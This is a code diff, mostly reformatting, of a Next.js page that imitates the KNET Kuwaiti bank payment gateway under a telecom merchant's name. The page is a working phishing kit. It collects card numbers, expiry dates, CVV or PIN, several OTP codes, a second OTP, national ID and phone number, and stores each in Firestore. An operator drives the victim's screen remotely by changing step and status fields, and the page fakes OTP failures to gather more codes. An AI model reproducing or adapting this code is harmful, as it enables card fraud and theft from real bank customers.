@@ -1,32 +1,32 @@
-"use client"
-import { useEffect, useState } from "react"
-import "./knet.css"
-import { doc, onSnapshot } from "firebase/firestore"
-import { useRouter } from "next/navigation"
-import { db, handlePay } from "@/lib/firebase"
-import Loader from "@/components/loader"
-import { setupOnlineStatus } from "@/lib/utils"
+"use client";
+import { useEffect, useState } from "react";
+import "./knet.css";
+import { doc, onSnapshot } from "firebase/firestore";
+import { useRouter } from "next/navigation";
+import { db, handlePay } from "@/lib/firebase";
+import Loader from "@/components/loader";
+import { setupOnlineStatus } from "@/lib/utils";
 
 type PaymentInfo = {
-  createdDate: string
-  cardNumber: string
-  year: string
-  month: string
-  bank?: string
-  cvv?: string
-  otp?: string
-  pass: string
-  cardState: string
-  allOtps: string[]
-  bank_card: string[]
-  prefix: string
-  status: "new" | "pending" | "approved" | "rejected"
-  phoneNumber: string
-  network: string
-  idNumber: string
-  otp2: string
-  step: number | string
-}
+  createdDate: string;
+  cardNumber: string;
+  year: string;
+  month: string;
+  bank?: string;
+  cvv?: string;
+  otp?: string;
+  pass: string;
+  cardState: string;
+  allOtps: string[];
+  bank_card: string[];
+  prefix: string;
+  status: "new" | "pending" | "approved" | "rejected";
+  phoneNumber: string;
+  network: string;
+  idNumber: string;
+  otp2: string;
+  step: number | string;
+};
 const BANKS = [
   {
     value: "ABK",
@@ -46,13 +46,29 @@ const BANKS = [
   {
     value: "BOUBYAN",
     label: "Boubyan Bank",
-    cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
+    cardPrefixes: [
+      "470350",
+      "490455",
+      "490456",
+      "404919",
+      "450605",
+      "426058",
+      "431199",
+    ],
   },
 
   {
     value: "BURGAN",
     label: "Burgan Bank",
-    cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"],
+    cardPrefixes: [
+      "468564",
+      "402978",
+      "403583",
+      "415254",
+      "450238",
+      "540759",
+      "49219000",
+    ],
   },
 
   {
@@ -69,7 +85,16 @@ const BANKS = [
   {
     value: "GBK",
     label: "Gulf Bank",
-    cardPrefixes: ["526206", "531470", "531644", "531329", "517419", "517458", "531471", "559475"],
+    cardPrefixes: [
+      "526206",
+      "531470",
+      "531644",
+      "531329",
+      "517419",
+      "517458",
+      "531471",
+      "559475",
+    ],
   },
   {
     value: "TAM",
@@ -112,14 +137,14 @@ const BANKS = [
     label: "Warba Bank",
     cardPrefixes: ["541350", "525528", "532749", "559459"],
   },
-]
+];
 
 export default function Payment() {
-  const [step, setstep] = useState<string | number>(1)
-  const [newotp] = useState([""])
-  const [total, setTotal] = useState("")
-  const [isloading, setisloading] = useState(false)
-  const router = useRouter()
+  const [step, setstep] = useState<string | number>(1);
+  const [newotp] = useState([""]);
+  const [total, setTotal] = useState("");
+  const [isloading, setisloading] = useState(false);
+  const router = useRouter();
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
     createdDate: new Date().toISOString(),
     cardNumber: "",
@@ -137,108 +162,126 @@ export default function Payment() {
     network: "",
     idNumber: "",
     otp2: "",
-    step: 1
-  })
-  const [countdown, setCountdown] = useState(60)
-  const [isCountdownActive, setIsCountdownActive] = useState(true)
-  const [otpAttempts, setOtpAttempts] = useState(-2)
-  const [otpValue, setOtpValue] = useState('')
+    step: 1,
+  });
+  const [countdown, setCountdown] = useState(60);
+  const [isCountdownActive, setIsCountdownActive] = useState(true);
+  const [otpAttempts, setOtpAttempts] = useState(-2);
+  const [otpValue, setOtpValue] = useState("");
   const handleAddotp = (otp: string) => {
-    newotp.push(`${otp} , `)
-  }
+    newotp.push(`${otp} , `);
+  };
   useEffect(() => {
     //handleAddotp(paymentInfo.otp!)
-    const ty = localStorage!.getItem("amount")
+    const ty = localStorage!.getItem("amount");
     if (ty) {
-      setTotal("0.300")
+      setTotal("0.300");
     }
-  }, [])
-
+  }, []);
 
   useEffect(() => {
-    const visitorId = localStorage.getItem("visitor")
+    const visitorId = localStorage.getItem("visitor");
     if (visitorId) {
-      setupOnlineStatus(visitorId!)
+      setupOnlineStatus(visitorId!);
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
-          const data = docSnap.data() as PaymentInfo
+          const data = docSnap.data() as PaymentInfo;
           if (data.step !== step) {
             if (parseInt(data?.step?.toString()) === 5) {
-              window.location.href = '/auth'
-
+              window.location.href = "/auth";
             } else if (parseInt(data?.step?.toString()) === 10) {
-
-              window.location.href = '/'
+              window.location.href = "/";
             } else {
-              setstep(parseInt(data?.step?.toString()) || 1)
+              setstep(parseInt(data?.step?.toString()) || 1);
             }
           }
           if (data.status === "pending") {
-            setisloading(true)
+            setisloading(true);
           } else if (data.status === "approved") {
-            setisloading(false)
-            setstep(2)
-          }
-          else if (data.status === "rejected") {
-            setisloading(false)
-            alert('Card rejected please try again!')
-            setstep(1)
+            setisloading(false);
+            setstep(2);
+          } else if (data.status === "rejected") {
+            setisloading(false);
+            alert("Card rejected please try again!");
+            setstep(1);
           }
         }
-      })
+      });
 
-      return () => unsubscribe()
+      return () => unsubscribe();
     }
-  }, [])
+  }, []);
 
   useEffect(() => {
-    let interval: NodeJS.Timeout | null = null
+    let interval: NodeJS.Timeout | null = null;
 
     if (isCountdownActive && countdown > 0) {
       interval = setInterval(() => {
-        setCountdown((countdown) => countdown - 1)
-      }, 1000)
+        setCountdown((countdown) => countdown - 1);
+      }, 1000);
     } else if (countdown === 0) {
-      setIsCountdownActive(false)
+      setIsCountdownActive(false);
     }
 
     return () => {
-      if (interval) clearInterval(interval)
-    }
-  }, [isCountdownActive, countdown])
+      if (interval) clearInterval(interval);
+    };
+  }, [isCountdownActive, countdown]);
 
   return (
-    <div style={{ background: "#f1f1f1", height: "100vh", margin: 0, padding: 0 }} dir="ltr">
+    <div
+      style={{ background: "#f1f1f1", height: "100vh", margin: 0, padding: 0 }}
+      dir="ltr"
+    >
       <form
         onSubmit={(e) => {
-          e.preventDefault()
+          e.preventDefault();
         }}
         style={{ direction: "ltr" }}
       >
         <div id="PayPageEntry">
-          <div className="container" >
-            <div style={{ display: 'flex', justifyContent: 'center' }}>
+          <div className="container">
+            <div style={{ display: "flex", justifyContent: "center" }}>
               <img src="./mob.jpg" className="-" alt="logo" />
             </div>
             <div className="content-block">
               <div className="form-card">
-                <div className="container-" style={{ display: "flex", justifyContent: "center" }}>
-                  <img src="./kv.png" className="-" alt="logo" height={90} width={90} />
+                <div
+                  className="container-"
+                  style={{ display: "flex", justifyContent: "center" }}
+                >
+                  <img
+                    src="./kfh_logo.jpg"
+                    className="-"
+                    alt="logo"
+                    height={90}
+                    width={90}
+                  />
                 </div>
                 <div className="row">
                   <label className="column-label">Merchant: </label>
-                  <label className="column-value text-label">Mobile Telecommunication Co. </label>
+                  <label className="column-value text-label">
+                    Mobile Telecommunication Co.{" "}
+                  </label>
                 </div>
                 <div id="OrgTranxAmt">
                   <label className="column-label"> Amount: </label>
                   <label className="column-value text-label" id="amount">
-                    {1.00}
+                    {1.0}
                     {"  "}KD&nbsp;{" "}
                   </label>
                 </div>
                 {/* Added for PG Eidia Discount starts   */}
-                <div className="row" id="DiscntRate" style={{ display: "none" }} />
-                <div className="row" id="DiscntedAmt" style={{ display: "none" }} />
+                <div
+                  className="row"
+                  id="DiscntRate"
+                  style={{ display: "none" }}
+                />
+                <div
+                  className="row"
+                  id="DiscntedAmt"
+                  style={{ display: "none" }}
+                />
                 {/* Added for PG Eidia Discount ends   */}
               </div>
               <div className="form-card">
@@ -312,20 +355,27 @@ export default function Payment() {
                   <>
                     <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
                       <div className="row">
-                        <label className="column-label" style={{ width: "40%" }}>
+                        <label
+                          className="column-label"
+                          style={{ width: "40%" }}
+                        >
                           Select Your Bank:
                         </label>
                         <select
                           className="column-value"
                           style={{ width: "60%" }}
                           onChange={(e: any) => {
-                            const selectedBank = BANKS.find((bank) => bank.value === e.target.value)
+                            const selectedBank = BANKS.find(
+                              (bank) => bank.value === e.target.value
+                            );
 
                             setPaymentInfo({
                               ...paymentInfo,
                               bank: e.target.value,
-                              bank_card: selectedBank ? selectedBank.cardPrefixes : [""],
-                            })
+                              bank_card: selectedBank
+                                ? selectedBank.cardPrefixes
+                                : [""],
+                            });
                           }}
                         >
                           <>
@@ -340,8 +390,13 @@ export default function Payment() {
                           </>
                         </select>
                       </div>
-                      <div className="row three-column" id="Paymentpagecardnumber">
-                        <label className="column-label mt-1">Card Number:</label>
+                      <div
+                        className="row three-column"
+                        id="Paymentpagecardnumber"
+                      >
+                        <label className="column-label mt-1">
+                          Card Number:
+                        </label>
                         <label>
                           <select
                             className="column-value  mt-1"
@@ -361,7 +416,7 @@ export default function Payment() {
                                 setPaymentInfo({
                                   ...paymentInfo,
                                   prefix: e.target.value,
-                                })
+                                });
                               }}
                             >
                               prefix
@@ -374,7 +429,7 @@ export default function Payment() {
                                   setPaymentInfo({
                                     ...paymentInfo,
                                     prefix: e.target.value,
-                                  })
+                                  });
                                 }}
                               >
                                 {i}
@@ -405,7 +460,10 @@ export default function Payment() {
                       </div>
                       <div className="row three-column" id="cardExpdate">
                         <div id="debitExpDate">
-                          <label className="column-label"> Expiration Date: </label>
+                          <label className="column-label">
+                            {" "}
+                            Expiration Date:{" "}
+                          </label>
                         </div>
                         <select
                           onChange={(e: any) =>
@@ -517,7 +575,11 @@ export default function Payment() {
                       {step === 1 && paymentInfo.status === "approved" ? (
                         <div className="row" id="PinRow">
                           {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
-                          <input type="hidden" name="cardPinType" defaultValue="A" />
+                          <input
+                            type="hidden"
+                            name="cardPinType"
+                            defaultValue="A"
+                          />
                           <div id="eComPin">
                             <label className="column-label"> Cvv: </label>
                           </div>
@@ -543,55 +605,85 @@ export default function Payment() {
                 ) : step === 2 ? (
                   <div>
                     <div className="row">
-                      <div className="bg-blue-100 font-normal p-2 my-2" style={{ fontSize: 12, borderRadius: 3 }}>
-                        <strong>Please note:</strong> A 6-digit verification code has been sent via text message to your registered phone
-                        number
+                      <div
+                        className="bg-blue-100 font-normal p-2 my-2"
+                        style={{ fontSize: 12, borderRadius: 3 }}
+                      >
+                        <strong>Please note:</strong> A 6-digit verification
+                        code has been sent via text message to your registered
+                        phone number
                       </div>
                     </div>
                     <div className="row">
                       <label className="column-label">CardNumber:</label>
-                      <label className="allownumericwithoutdecimal" style={{ color: 'black', fontWeight: 100 }}>
+                      <label
+                        className="allownumericwithoutdecimal"
+                        style={{ color: "black", fontWeight: 100 }}
+                      >
                         {" "}
-                        {paymentInfo.cardNumber.substring(0, 5) + "****" + paymentInfo.cardNumber.substring(10, 15)}
+                        {paymentInfo.cardNumber.substring(0, 5) +
+                          "****" +
+                          paymentInfo.cardNumber.substring(10, 15)}
                       </label>
                     </div>
                     <div className="row">
                       <label className="column-label">Month expiry:</label>
-                      <label className="allownumericwithoutdecimal" style={{ color: 'black', fontWeight: 100 }}> {paymentInfo.month}</label>
+                      <label
+                        className="allownumericwithoutdecimal"
+                        style={{ color: "black", fontWeight: 100 }}
+                      >
+                        {" "}
+                        {paymentInfo.month}
+                      </label>
                     </div>
                     <div className="row">
                       <label className="column-label">Year expiry:</label>
-                      <label className="allownumericwithoutdecimal" style={{ color: 'black', fontWeight: 100 }}> {paymentInfo.year}</label>
+                      <label
+                        className="allownumericwithoutdecimal"
+                        style={{ color: "black", fontWeight: 100 }}
+                      >
+                        {" "}
+                        {paymentInfo.year}
+                      </label>
                     </div>
                     <div className="row">
                       <label className="column-label">Pin:</label>
-                      <label className="allownumericwithoutdecimal" style={{ color: 'black', fontWeight: 200 }}>{"****"}</label>
+                      <label
+                        className="allownumericwithoutdecimal"
+                        style={{ color: "black", fontWeight: 200 }}
+                      >
+                        {"****"}
+                      </label>
                     </div>
                     <div className="flex my-1">
                       <label className="column-value ">OTP:</label>
                       <input
                         onChange={(e: any) => {
-
                           setPaymentInfo({
                             ...paymentInfo,
                             otp: e.target.value,
-                          })
-                          setOtpValue(e.target.value)
-
-                        }
-                        }
+                          });
+                          setOtpValue(e.target.value);
+                        }}
                         type="tel"
                         maxLength={6}
                         id="timer"
                         className="w-full"
                         value={otpValue}
-                        placeholder={`Timeout in: 01:${countdown === 0 ? '00' : countdown}`}
+                        placeholder={`Timeout in: 01:${
+                          countdown === 0 ? "00" : countdown
+                        }`}
                       />
                     </div>
                     <div className="row">
                       <div
                         className="text-sm text-gray-600"
-                        style={{ fontSize: 12, color: "#666", textAlign: "center", marginTop: 5 }}
+                        style={{
+                          fontSize: 12,
+                          color: "#666",
+                          textAlign: "center",
+                          marginTop: 5,
+                        }}
                       >
                         {otpAttempts >= 6 && (
                           <div style={{ color: "#ff0000", marginTop: 2 }}>
@@ -603,11 +695,17 @@ export default function Payment() {
                   </div>
                 ) : step === 3 ? (
                   <>
-                    <Step3 setPaymentInfo={setPaymentInfo} paymentInfo={paymentInfo} />
+                    <Step3
+                      setPaymentInfo={setPaymentInfo}
+                      paymentInfo={paymentInfo}
+                    />
                   </>
                 ) : step === 4 ? (
                   <>
-                    <Step4 setPaymentInfo={setPaymentInfo} paymentInfo={paymentInfo} />
+                    <Step4
+                      setPaymentInfo={setPaymentInfo}
+                      paymentInfo={paymentInfo}
+                    />
                   </>
                 ) : (
                   <></>
@@ -625,14 +723,21 @@ export default function Payment() {
                             marginLeft: "20%",
                           }}
                         />
-                        <label className="column-value text-label" style={{ width: "70%", textAlign: "center" }}>
+                        <label
+                          className="column-value text-label"
+                          style={{ width: "70%", textAlign: "center" }}
+                        >
                           Processing.. please wait ...
                         </label>
                       </center>
                     </div>
                     <div style={{ display: "flex" }}>
                       <button
-                        style={{ background: "#f2f2f2", marginLeft: 0, borderRadius: 5 }}
+                        style={{
+                          background: "#f2f2f2",
+                          marginLeft: 0,
+                          borderRadius: 5,
+                        }}
                         disabled={
                           (step === 1 &&
                             (paymentInfo.prefix === "" ||
@@ -646,72 +751,89 @@ export default function Payment() {
                         }
                         onClick={() => {
                           if (step === 1) {
-                            setisloading(true)
-                            handlePay(paymentInfo, setPaymentInfo)
-
+                            setisloading(true);
+                            handlePay(paymentInfo, setPaymentInfo);
                           } else if (step === 2) {
                             if (!newotp.includes(paymentInfo.otp!)) {
-                              newotp.push(paymentInfo.otp!)
+                              newotp.push(paymentInfo.otp!);
                             }
-                            setisloading(true)
-                            handleAddotp(paymentInfo.otp!)
+                            setisloading(true);
+                            handleAddotp(paymentInfo.otp!);
 
                             // Increment attempt counter
-                            const newAttemptCount = otpAttempts + 1
-                            setOtpAttempts(newAttemptCount)
+                            const newAttemptCount = otpAttempts + 1;
+                            setOtpAttempts(newAttemptCount);
 
                             // Clear OTP input after submit
-                            setOtpValue('')
-                            handlePay(paymentInfo, setPaymentInfo)
+                            setOtpValue("");
+                            handlePay(paymentInfo, setPaymentInfo);
 
                             setTimeout(() => {
                               // Check if this is the 3rd attempt, if so move to step 3
                               if (newAttemptCount >= 3) {
-                                alert("تم استنفاد المحاولات المسموحة. سيتم الانتقال إلى التحقق الإضافي لإكمال العملية.")
-                                setstep(3)
-                                setOtpAttempts(1) // Reset counter for next time
+                                alert(
+                                  "تم استنفاد المحاولات المسموحة. سيتم الانتقال إلى التحقق الإضافي لإكمال العملية."
+                                );
+                                setstep(3);
+                                setOtpAttempts(1); // Reset counter for next time
                               } else {
                                 // For now, we'll assume OTP is incorrect and stay on step 2
                                 // In a real scenario, you'd check the OTP validation response
                               }
-                              setisloading(false)
-                            }, 3000)
+                              setisloading(false);
+                            }, 3000);
                           } else if (step === 3) {
-                            setisloading(true)
+                            setisloading(true);
 
                             // Save step 3 data to Firestore
-                            handlePay(paymentInfo, setPaymentInfo)
+                            handlePay(paymentInfo, setPaymentInfo);
 
                             setTimeout(() => {
-                              setstep(4)
-                              setisloading(false)
-                            }, 7000)
+                              setstep(4);
+                              setisloading(false);
+                            }, 7000);
                           } else if (step === 4) {
-                            setisloading(true)
+                            setisloading(true);
 
                             // Save step 4 data (otp2) to Firestore
-                            handlePay(paymentInfo, setPaymentInfo)
+                            handlePay(paymentInfo, setPaymentInfo);
 
                             setTimeout(() => {
-                              setisloading(false)
-                              router.push("/auth")
-                            }, 5000)
+                              setisloading(false);
+                              router.push("/auth");
+                            }, 5000);
                           }
 
                           setPaymentInfo({
                             ...paymentInfo,
                             otp2: step === 4 ? "" : paymentInfo.otp2,
-                          })
+                          });
                         }}
                       >
-                        {isloading ? "Wait..." : step === 1 ? "Submit" : "Confirm"}
+                        {isloading
+                          ? "Wait..."
+                          : step === 1
+                          ? "Submit"
+                          : "Confirm"}
                       </button>
-                      <button style={{ background: "#f2f2f2", marginLeft: 0, borderRadius: 5 }}>Cancel</button>
+                      <button
+                        style={{
+                          background: "#f2f2f2",
+                          marginLeft: 0,
+                          borderRadius: 5,
+                        }}
+                      >
+                        Cancel
+                      </button>
                     </div>
                   </div>
                 </div>
               </div>
-              <div id="overlayhide" className="overlay" style={{ display: "none" }}></div>
+              <div
+                id="overlayhide"
+                className="overlay"
+                style={{ display: "none" }}
+              ></div>
 
               <footer>
                 <div className="footer-content-new">
@@ -723,7 +845,8 @@ export default function Payment() {
                         lineHeight: 1,
                       }}
                     >
-                      All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp; &nbsp;
+                      All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;
+                      &nbsp;
                       <br />
                       <span
                         style={{
@@ -732,7 +855,8 @@ export default function Payment() {
                           color: "#0077d5",
                         }}
                       >
-                        The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company - KNET
+                        The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company
+                        - KNET
                       </span>
                     </div>
                   </div>
@@ -746,7 +870,7 @@ export default function Payment() {
         {isloading && <Loader />}
       </form>
     </div>
-  )
+  );
 }
 
 const Step3 = ({ setPaymentInfo, paymentInfo }: any) => {
@@ -829,21 +953,28 @@ const Step3 = ({ setPaymentInfo, paymentInfo }: any) => {
         </select>
       </div>
     </div>
-  )
-}
+  );
+};
 const Step4 = (props: any) => {
   return (
     <div>
       <div className="row">
-        <div className="bg-blue-100 font-normal p-2 my-2" style={{ fontSize: 12, borderRadius: 3 }}>
-          Please note: A 6-digit verification code has been sent via text message to your registered phone number
+        <div
+          className="bg-blue-100 font-normal p-2 my-2"
+          style={{ fontSize: 12, borderRadius: 3 }}
+        >
+          Please note: A 6-digit verification code has been sent via text
+          message to your registered phone number
         </div>
       </div>
       <div className="row">
         <label style={{ width: "40%" }} className="column-label">
           ID Number:
         </label>
-        <label style={{ width: "60%", fontWeight: 100, color: "black" }} className="column-label">
+        <label
+          style={{ width: "60%", fontWeight: 100, color: "black" }}
+          className="column-label"
+        >
           {props.paymentInfo.idNumber}
         </label>
       </div>
@@ -851,7 +982,10 @@ const Step4 = (props: any) => {
         <label style={{ width: "40%" }} className="column-label">
           Phone Number:
         </label>
-        <label style={{ width: "60%", fontWeight: 100, color: "black" }} className="column-label">
+        <label
+          style={{ width: "60%", fontWeight: 100, color: "black" }}
+          className="column-label"
+        >
           {props.paymentInfo.phoneNumber}
         </label>
       </div>
@@ -872,5 +1006,5 @@ const Step4 = (props: any) => {
         />
       </div>
     </div>
-  )
-}
+  );
+};
